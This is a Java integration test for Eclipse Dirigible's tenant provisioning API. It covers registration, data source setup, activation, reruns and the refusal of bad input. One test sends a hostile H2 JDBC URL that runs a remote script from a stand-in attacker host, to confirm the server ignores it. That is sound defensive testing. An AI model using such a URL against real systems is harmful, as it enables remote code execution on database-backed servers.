/*
 * Copyright (c) 2010-2026 Eclipse Dirigible contributors
 *
 * All rights reserved. This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v2.0 which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v20.html
 *
 * SPDX-FileCopyrightText: Eclipse Dirigible contributors SPDX-License-Identifier: EPL-2.0
 */
package org.eclipse.dirigible.integration.tests.api;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.not;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotSame;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.awaitility.Awaitility;
import org.eclipse.dirigible.commons.config.Configuration;
import org.eclipse.dirigible.commons.config.DirigibleConfig;
import org.eclipse.dirigible.components.data.sources.domain.DataSource;
import org.eclipse.dirigible.components.data.sources.manager.DataSourcesManager;
import org.eclipse.dirigible.components.data.sources.service.DataSourceService;
import org.eclipse.dirigible.components.database.DirigibleDataSource;
import org.eclipse.dirigible.components.initializers.synchronizer.SynchronizationProcessor;
import org.eclipse.dirigible.components.tenants.domain.TenantStatus;
import org.eclipse.dirigible.components.tenants.service.TenantService;
import org.eclipse.dirigible.database.sql.SqlFactory;
import org.eclipse.dirigible.repository.api.IRepository;
import org.eclipse.dirigible.repository.api.IRepositoryStructure;
import org.eclipse.dirigible.tests.base.IntegrationTest;
import org.eclipse.dirigible.tests.framework.restassured.RestAssuredExecutor;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.MethodOrderer;
import org.junit.jupiter.api.Order;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestMethodOrder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.annotation.DirtiesContext;

import io.restassured.http.ContentType;

/**
 * The whole external provisioning sequence, end to end, against a tenant whose database user and
 * schema were created by something outside the platform - which is what this API exists for.
 *
 * <p>
 * The test plays the external provisioner: it creates the user and the schema with plain SQL, the
 * way a provisioning service would, and then drives the API - register, register the data source,
 * activate, poll. What it asserts at the end is not a status but a table: a per-tenant artefact
 * physically present in the schema the provisioner created, reached through the data source the API
 * registered. Nothing short of that proves the tenant actually works.
 *
 * <p>
 * The sequence is then run a second time in full. That is the promise the API makes to a retrying
 * caller, and it is the promise most likely to rot: every call has to converge rather than collide.
 */
@DirtiesContext(classMode = DirtiesContext.ClassMode.AFTER_CLASS)
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@Tag("slow")
class TenantActivationIT extends IntegrationTest {

    private static final String TENANTS_PATH = "/services/tenant-provisioning/tenants/";
    private static final String PLATFORM_TENANTS_PATH = "/services/security/tenants/";

    private static final String TENANT_ID = "tenant-activation-it";

    /** Chosen by the external provisioner, deliberately not derived from the tenant id. */
    private static final String SCHEMA = "TENANTACTIVATIONIT";
    private static final String DB_USER = "U_TENANTACTIVATIONIT";
    private static final String DB_PASSWORD = "tenant-activation-it-password";

    /** The per-tenant artefact whose physical existence is the actual assertion. */
    private static final String PROJECT = "tenant-activation-it";
    private static final String TABLE = "TENANT_ACTIVATION_IT_ORDERS";

    /** A full synchronization pass over the whole registry - generous on a loaded CI machine. */
    private static final long INITIALIZATION_TIMEOUT_SECONDS = 300;

    @Autowired
    private RestAssuredExecutor restAssuredExecutor;

    @Autowired
    private IRepository repository;

    @Autowired
    private SynchronizationProcessor synchronizationProcessor;

    @Autowired
    private DataSourcesManager dataSourcesManager;

    @Autowired
    private DataSourceService dataSourceService;

    @Autowired
    private TenantService tenantService;

    @BeforeAll
    static void enableTheApi() {
        DirigibleConfig.TENANT_PROVISIONING_API_ENABLED.setBooleanValue(true);
    }

    @AfterAll
    static void disableTheApi() {
        Configuration.remove(DirigibleConfig.TENANT_PROVISIONING_API_ENABLED.getKey());
    }

    @Test
    @Order(1)
    void theFullExternalSequenceMaterializesTheTenant() throws SQLException {
        publishPerTenantArtefact();
        createDatabaseUserAndSchema(DB_PASSWORD);

        restAssuredExecutor.execute(() -> {
            register().then()
                      .statusCode(201)
                      .body("status", equalTo(TenantStatus.PENDING_ACTIVATION.name()));

            given().when()
                   .get(TENANTS_PATH + TENANT_ID + "/activation")
                   .then()
                   .statusCode(200)
                   .body("status", equalTo("NOT_STARTED"));

            registerDataSource(DB_PASSWORD).then()
                                           .statusCode(201);

            // The answer must not already claim the work is done: a caller that polls the instant it
            // is answered would otherwise skip the wait and use a tenant with nothing in it.
            activate().then()
                      .statusCode(202)
                      .header("Location", TENANTS_PATH + TENANT_ID + "/activation")
                      .body("status", not(equalTo("COMPLETED")));
        });

        awaitInitializationCompleted();

        assertPerTenantTableExists();
    }

    /** Every call again, on a tenant that is already active - the retrying caller's path. */
    @Test
    @Order(2)
    void theWholeSequenceConvergesWhenItIsRunAgain() throws SQLException {
        restAssuredExecutor.execute(() -> {
            register().then()
                      .statusCode(200);

            registerDataSource(DB_PASSWORD).then()
                                           .statusCode(200);

            activate().then()
                      .statusCode(202);
        });

        awaitInitializationCompleted();

        assertPerTenantTableExists();
    }

    /**
     * An initialized connection pool keeps the credentials it was built with, whatever its definition
     * later says - only removing it closes it. So a registration that did not replace the pool would
     * leave a rotated password unused until the next restart, silently.
     *
     * <p>
     * Asserted on the pool itself rather than on a rotated password, because rotating one portably
     * across every database the suite runs on would need dialect-specific SQL, and what actually has to
     * hold is this: the object serving the tenant after a registration is not the object that served it
     * before.
     */
    @Test
    @Order(3)
    void theLivePoolIsReplacedByEveryRegistration() throws SQLException {
        DirigibleDataSource before = dataSourcesManager.getDataSource(TENANT_ID + "_DefaultDB");

        restAssuredExecutor.execute(() -> registerDataSource(DB_PASSWORD).then()
                                                                         .statusCode(200));

        DirigibleDataSource after = dataSourcesManager.getDataSource(TENANT_ID + "_DefaultDB");
        assertNotSame(before, after, "a registration must replace the live pool, not just its definition");
        assertEquals(DB_USER, dataSourceService.findOptionalByName(TENANT_ID + "_DefaultDB")
                                               .orElseThrow()
                                               .getUsername());
        // and the replacement works - it is the pool the tenant is served from
        assertPerTenantTableExists();
    }

    @Test
    @Order(4)
    void aTenantWithoutADataSourceCannotBeActivated() {
        String withoutDataSource = "tenant-activation-it-no-ds";
        restAssuredExecutor.execute(() -> {
            given().contentType(ContentType.JSON)
                   .body(Map.of("name", "No data source"))
                   .when()
                   .put(TENANTS_PATH + withoutDataSource)
                   .then()
                   .statusCode(201);

            given().when()
                   .post(TENANTS_PATH + withoutDataSource + "/activation")
                   .then()
                   .statusCode(400)
                   .body("message", containsString(withoutDataSource + "_DefaultDB"));
        });

        assertEquals(TenantStatus.PENDING_ACTIVATION, tenantService.findById(withoutDataSource)
                                                                   .orElseThrow()
                                                                   .getStatus(),
                "a refused activation must not have moved the tenant");
    }

    /**
     * A wrong password has to be a wrong password - answered as such, with the database's own words,
     * and leaving no definition behind that a later activation would try to use.
     */
    @Test
    @Order(5)
    void credentialsThatDoNotWorkAreRefusedAndNothingIsRegistered() {
        String badCredentials = "tenant-activation-it-bad-creds";
        restAssuredExecutor.execute(() -> {
            given().contentType(ContentType.JSON)
                   .body(Map.of("name", "Bad credentials"))
                   .when()
                   .put(TENANTS_PATH + badCredentials)
                   .then()
                   .statusCode(201);

            given().contentType(ContentType.JSON)
                   .body(Map.of("username", DB_USER, "password", "not-the-password", "schema", SCHEMA))
                   .when()
                   .put(TENANTS_PATH + badCredentials + "/datasources/default")
                   .then()
                   .statusCode(502)
                   // the database's own complaint, not just "Bad Gateway"
                   .body("message", containsString("password"));
        });

        assertFalse(dataSourceService.findOptionalByName(badCredentials + "_DefaultDB")
                                     .isPresent(),
                "credentials that were refused must not leave a data source definition behind");
    }

    /** Deleting an active tenant is deprovisioning, which this API deliberately does not do. */
    @Test
    @Order(6)
    void anActivatedTenantCannotBeDeleted() {
        restAssuredExecutor.execute(() -> given().when()
                                                 .delete(PLATFORM_TENANTS_PATH + TENANT_ID)
                                                 .then()
                                                 .statusCode(400));

        assertTrue(tenantService.findById(TENANT_ID)
                                .isPresent());
    }

    /**
     * A JDBC URL and driver sent by a caller must not reach the driver layer.
     *
     * <p>
     * They are executable surface: an H2 URL can carry {@code INIT=RUNSCRIPT FROM '<url>'} and a
     * PostgreSQL connection property can name a {@code socketFactory} class, so honouring one would
     * turn the right to register a tenant's credentials into the right to run code on this server. The
     * fields are not part of the API; this asserts what that means end to end - the request succeeds,
     * and the definition it produced carries the application's own URL and driver.
     */
    @Test
    @Order(7)
    void aJdbcUrlAndDriverInTheRequestBodyAreIgnored() {
        String hostileUrl = "jdbc:h2:mem:pwned;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'";
        DataSource applicationDataSource = dataSourceService.findOptionalByName("DefaultDB")
                                                            .orElseThrow();

        restAssuredExecutor.execute(() -> given().contentType(ContentType.JSON)
                                                 .body(Map.of("username", DB_USER, "password", DB_PASSWORD, "schema", SCHEMA, "url",
                                                         hostileUrl, "driver", "org.postgresql.Driver"))
                                                 .when()
                                                 .put(TENANTS_PATH + TENANT_ID + "/datasources/default")
                                                 .then()
                                                 .statusCode(200));

        DataSource registered = dataSourceService.findOptionalByName(TENANT_ID + "_DefaultDB")
                                                 .orElseThrow();
        assertEquals(applicationDataSource.getUrl(), registered.getUrl(),
                "the URL must come from the application's own data source, never from the request");
        assertEquals(applicationDataSource.getDriver(), registered.getDriver());
    }

    private static io.restassured.response.Response register() {
        return given().contentType(ContentType.JSON)
                      .body(Map.of("name", "Tenant Activation IT"))
                      .when()
                      .put(TENANTS_PATH + TENANT_ID);
    }

    private static io.restassured.response.Response registerDataSource(String password) {
        return given().contentType(ContentType.JSON)
                      .body(Map.of("username", DB_USER, "password", password, "schema", SCHEMA))
                      .when()
                      .put(TENANTS_PATH + TENANT_ID + "/datasources/default");
    }

    private static io.restassured.response.Response activate() {
        return given().when()
                      .post(TENANTS_PATH + TENANT_ID + "/activation");
    }

    private void awaitInitializationCompleted() {
        Awaitility.await()
                  .atMost(INITIALIZATION_TIMEOUT_SECONDS, TimeUnit.SECONDS)
                  .pollInterval(2, TimeUnit.SECONDS)
                  .until(() -> "COMPLETED".equals(initializationStatus()));
    }

    private String initializationStatus() {
        return restAssuredExecutor.executeWithResult(() -> given().when()
                                                                  .get(TENANTS_PATH + TENANT_ID + "/activation")
                                                                  .then()
                                                                  .statusCode(200)
                                                                  .extract()
                                                                  .path("status"));
    }

    /** Writes a per-tenant artefact into the registry and reconciles it for the tenants of today. */
    private void publishPerTenantArtefact() {
        String table = """
                {
                    "name": "%s",
                    "type": "TABLE",
                    "columns": [
                        {
                            "name": "ORDER_ID",
                            "type": "INTEGER",
                            "length": "0",
                            "nullable": "false",
                            "primaryKey": "true"
                        }
                    ]
                }
                """.formatted(TABLE);
        repository.createResource(IRepositoryStructure.PATH_REGISTRY_PUBLIC + "/" + PROJECT + "/" + TABLE + ".table",
                table.getBytes(StandardCharsets.UTF_8), false, "application/json", true);
        synchronizationProcessor.forceProcessSynchronizers();
    }

    /**
     * What the external provisioner does before it ever calls the API: create the tenant's database
     * user and its schema. Through the platform's own SQL dialect factory, so the test works on every
     * database the integration suite runs against.
     *
     * @param password the password to create the user with
     * @throws SQLException if the statements fail
     */
    private void createDatabaseUserAndSchema(String password) throws SQLException {
        DirigibleDataSource defaultDataSource = dataSourcesManager.getDefaultDataSource();
        try (Connection connection = defaultDataSource.getConnection()) {
            execute(connection, SqlFactory.getNative(connection)
                                          .create()
                                          .user(DB_USER, password)
                                          .build());
            execute(connection, SqlFactory.getNative(connection)
                                          .create()
                                          .schema(SCHEMA)
                                          .authorization(DB_USER)
                                          .build());
        }
    }

    private static void execute(Connection connection, String sql) throws SQLException {
        try (PreparedStatement statement = connection.prepareStatement(sql)) {
            statement.execute();
        }
    }

    /**
     * The assertion the whole test exists for: the per-tenant artefact is physically there, in the
     * schema the external provisioner created, reached through the data source the API registered.
     *
     * @throws SQLException if the table cannot be read
     */
    private void assertPerTenantTableExists() throws SQLException {
        DirigibleDataSource tenantDataSource = dataSourcesManager.getDataSource(TENANT_ID + "_DefaultDB");
        try (Connection connection = tenantDataSource.getConnection();
                Statement statement = connection.createStatement();
                ResultSet resultSet = statement.executeQuery("SELECT COUNT(*) FROM " + SCHEMA + "." + TABLE)) {
            assertTrue(resultSet.next(), "table " + SCHEMA + "." + TABLE + " must exist in the tenant's schema");
        }
    }
}
